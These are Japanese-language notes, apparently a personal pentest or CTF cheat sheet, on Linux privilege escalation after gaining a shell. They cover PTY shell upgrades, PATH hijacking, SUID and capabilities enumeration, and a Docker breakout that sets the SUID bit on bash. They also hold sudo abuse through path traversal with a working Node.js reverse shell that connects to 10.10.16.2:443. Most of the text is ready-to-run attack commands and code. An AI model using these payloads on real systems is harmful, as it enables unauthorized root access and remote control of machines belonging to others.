## ## Reverse shellが完了した後
ptyを使用したshell
```sh
方法1
python -c "import pty;pty.spawn('/bin/bash')"

方法2
script /
```
https://hidepatidar.medium.com/spawning-interactive-reverse-shell-7732686ea775

---
## ## 1. PATH
- シェルで使用するコマンドは、絶対パスで指定をしない限り、
  PATH変数で定義されるディレクトリを見に行く。
  
- ユーザが書き込み権限を持っているフォルダーがパスにある場合アプリケーションを
  乗っ取ってスクリプトを実行する可能性がある。
  
  ▼手順
   - この手法は、システムの既存の構成に依存しているため以下の点を確認する必要がある。
     1.  $PATHの下にあるフォルダー
     2.  現在のユーザは、これらのフォルダのいずれかに対する書き込み権限を持っているか？
     3.  $PATHを変更できるか。
     4.  この脆弱性の影響を受ける、スクリプト/アプリケーションはあるか？
     
	書き込み可能なフォルダーを検索する方法。
```sh
find / -writable 2>/dev/null | cut -d "
```
ここでecho $PATHとfindの結果を比較しPATHが通っているディレクトリに書き込み権限がないことがわかったら、/tmpなどの書き込みができるフォルダーのPATHを通してあげる必要がある。
```sh
export PATH=/tmp:$PATH
```

---
## ## 2. SUID
   1.SUIDまたはSGIDビットが「s」で設定されているコマンドを特定する。
```sh
find / -type f -perm -04000 -ls 2>/dev/null
```

   2. 上記で見つかったものを以下のサイトで調べる。
	https://gtfobins.github.io/#
   3. 上記のサイトで有効な手段が見つからなかった場合。
	  例えば、nanoユーザにrootとして実行できる権限が付与されている場合、その権限を使用して、rootが所有しているファイルでも関係なく読み取るか書き換えることが可能になる。
      
[自作CheetCheat](https://hackmd.io/w2nCuiJhSzyWfmBpeeXyJw)

---
## ## 3.Capabilities
1. 以下のコマンドを使用して有効なケーパビリティを確認できる。
```sh
getcap
```
2. 上記のコマンドのみだとめちゃくちゃエラー出力が出るので以下を実施。
```sh
getcap -r / 2>/dev/null
```

---
## ## Docker
   前提:コンテナ上でRoot権限を取得していること
   1. ホスト側で以下のコマンドを入力してDockerコンテナとホスト間で共有してあるディスクを確認する。
```sh
df -h
```

以下が返ってくる。
```sh
Filesystem      Size  Used Avail Use% Mounted on
udev            1.9G     0  1.9G   0% /dev
tmpfs           394M  1.3M  392M   1% /run
/dev/sda2       6.8G  4.3G  2.4G  64% /
tmpfs           2.0G     0  2.0G   0% /dev/shm
tmpfs           5.0M     0  5.0M   0% /run/lock
tmpfs           2.0G     0  2.0G   0% /sys/fs/cgroup
overlay         6.8G  4.3G  2.4G  64% /var/lib/docker/overlay2/4ec09ecfa6f3a290dc6b247d7f4ff71a398d4f17060cdaf065e8bb83007effec/merged
shm              64M     0   64M   0% /var/lib/docker/containers/e2378324fced58e8166b82ec842ae45961417b4195aade5113fdc9c6397edc69/mounts/shm
overlay         6.8G  4.3G  2.4G  64% /var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1/merged
shm              64M     0   64M   0% /var/lib/docker/containers/50bca5e748b0e547d000ecb8a4f889ee644a92f743e129e52f7a37af6c62e51e/mounts/shm
tmpfs           394M     0  394M   0% /run/user/1000
```

   2. DockerContainerにて以下のコマンドを実行
```sh
cd /bin/
chmod u+s ./bash
```
      
   3. マシンのホスト側にて以下を実施
```sh
bash -p
```
  - 参考
    - Hacktricks
      https://book.hacktricks.xyz/linux-hardening/privilege-escalation/docker-security/docker-breakout-privilege-escalation

---

## ## SUDO
   - sudo -l
    /usr/local/scripts/に書き込み権限がないときは/usr/local/scripts/../../../で書き込みができるディレクトリまでさかのぼり実行すればできる。
```sh
(ALL) /usr/bin/node /usr/local/scripts/*.js
```
     
- 以下のようなコードで実行可能
```sh
cat /home/angoose/reverseshell.js 

(function(){
var net = require("net"),
cp = require("child_process"),
sh = cp.spawn("/bin/bash", []);
var client = new net.Socket();
client.connect(443, "10.10.16.2", function(){
client.pipe(sh.stdin);
sh.stdout.pipe(client);
sh.stderr.pipe(client);
});
return /a/; // Prevents the Node.js application from crashing
})();
```

- payload
```sh
sudo /usr/bin/node /usr/local/scripts/../../../..//home/angoose/reverseshell.js
```